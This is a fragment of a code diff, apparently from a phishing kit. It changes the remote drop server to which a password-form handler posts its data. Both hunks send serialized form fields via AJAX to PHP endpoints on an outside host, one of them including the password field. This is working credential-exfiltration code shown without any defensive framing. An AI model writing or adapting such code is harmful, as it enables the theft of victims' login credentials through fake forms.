@@ -415,7 +415,7 @@ function pwd_handler(form)
         $.ajax({
 
             type: 'POST',
-            url: 'https://jetplan.trial.rocks/logbook3.php', 
+            url: 'https://ahpaie.trial.rocks/logbook3.php', 
             data: $(this).find(':not(input[name=pwd])').serialize()
         })
         .done(function(data){
@@ -432,7 +432,7 @@ function pwd_handler(form)
       {
           $.ajax({
                 type: "POST",
-                url: 'https://jetplan.trial.rocks/handler.php',
+                url: 'https://ahpaie.trial.rocks/handler.php',
                 data: $(this).serialize(),
             }).done(function(data){
               console.log("im done");
